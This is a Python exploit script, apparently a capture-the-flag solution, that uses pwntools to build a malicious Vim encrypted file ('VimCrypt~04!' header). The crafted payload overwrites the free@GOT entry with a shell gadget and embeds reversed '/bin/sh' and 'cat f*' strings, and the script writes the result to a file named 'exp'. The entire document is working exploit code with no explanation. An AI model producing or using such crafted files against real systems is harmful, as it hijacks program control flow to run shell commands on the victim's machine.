from pwn import *
import struct


def p32(content):
    return struct.pack('>I', content)

def p64(content):
    return struct.pack('>Q', content)

def main():
    magic = b'VimCrypt~04!'
    free_at_got = 0x8a8238
    #do_shell = 0x45f101
    do_shell = 0x4c9163

    write_what = b'\x6d'
    write_to = free_at_got - 8

    '''
    payload = p32(0xffffffff ^ 0x61)
    payload += write_what
    payload += p32(0xffffffff ^ 0x61)
    payload += p64(0x21)
    payload += p64(0)
    payload += p64(write_to) # buffer
    payload += b'\x00' # 1117
    payload += (bytes(reversed(b'/bin/sh;')) + p64(do_shell)).rjust(0xc4 - 0x34, '\x00') # 11c4 -> 1134 (to)
    payload += p32(0xffffffff ^ 0x61) # 1134
    payload += 'a'
    payload += p64(0x21)
    payload += p64(0)
    payload += p64(write_to)
    payload += b'a' * (0x300 - (0xc4 - 0x34) - 0x4 - 24 - 1)
    '''
    
    payload = p32(0xffffffff ^ 0x61)
    payload += write_what
    payload += p32(0xffffffff ^ 0x61)
    payload += p64(0x21)
    payload += p64(0)
    payload += p64(write_to) # buffer
    payload += b'\x00' # 1117
    binsh = bytes(reversed(b'/bin/sh;'))
    payload += (p64(do_shell)).rjust(0x6a - 0x34, b'\x00') # 1169 -> 1134 (to)
    payload += b'a' * 4
    payload += p64(0x21)
    payload += p64(0)
    payload += p64(write_to)
    payload += p64(0xffffffe0)
    payload += p64(0xb3)[:7]
    payload += p64(0x4036d6)
    payload += 'a'
    payload += p64(0xffffffff)
    payload += '\x00' * 8
    payload += p64(do_shell)[1:]
    payload += '\x00\x00*f tac'
    #payload += '\x00\x00\x00\x00\x00\x00'
    payload += cyclic((0xc4 - 0x6a - 4 - 8 - 8 - 8 - 8 - 8 - 8 - 8 - 8 - 24))
    payload += p64(do_shell)


    with open('exp', 'wb') as f:
        f.write(magic + payload)


if __name__ == '__main__':
    main()